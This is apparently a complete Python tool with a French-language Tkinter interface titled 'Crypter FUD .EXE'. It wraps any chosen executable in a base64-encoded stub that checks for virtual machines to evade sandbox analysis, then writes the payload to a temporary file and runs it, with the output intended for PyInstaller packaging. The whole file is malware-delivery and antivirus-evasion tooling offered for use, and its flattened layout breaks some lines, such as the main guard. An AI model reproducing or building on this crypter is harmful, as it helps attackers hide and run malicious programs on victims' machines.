import tkinter as tk from tkinter import filedialog, messagebox import base64 import os import tempfile

def encode_file(file_path): with open(file_path, "rb") as f: return base64.b64encode(f.read()).decode("utf-8")

def generate_stub(encoded_payload): return f'''import base64 import tempfile import subprocess import os import sys

def detect_vm(): indicators = ["VBOX", "VMWARE", "VirtualBox", "QEMU", "Hyper-V"] try: with open("/sys/class/dmi/id/product_name", "r") as f: content = f.read().upper() for indicator in indicators: if indicator in content: sys.exit() except: pass

def run_payload(): encoded = """{encoded_payload}""" binary = base64.b64decode(encoded) with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as f: f.write(binary) f.flush() subprocess.call([f.name], shell=True)

if name == "main": detect_vm() run_payload() '''

def save_stub(content): path = filedialog.asksaveasfilename(defaultextension=".py", filetypes=[("Python Files", "*.py")]) if path: with open(path, "w") as f: f.write(content) messagebox.showinfo("Succès", f"Stub créé : {path}")

def select_file(): file_path = filedialog.askopenfilename(filetypes=[("EXE Files", "*.exe")]) if file_path: encoded = encode_file(file_path) stub_code = generate_stub(encoded) save_stub(stub_code)

Interface

app = tk.Tk() app.title("Crypter FUD .EXE") app.geometry("400x200")

label = tk.Label(app, text="Crypteur FUD .EXE (Base64 Stub)", font=("Arial", 14)) label.pack(pady=20)

select_btn = tk.Button(app, text="Sélectionner un .exe à crypter", command=select_file) select_btn.pack(pady=10)

info = tk.Label(app, text="Un fichier .py sera généré pour PyInstaller", fg="gray") info.pack()

app.mainloop()

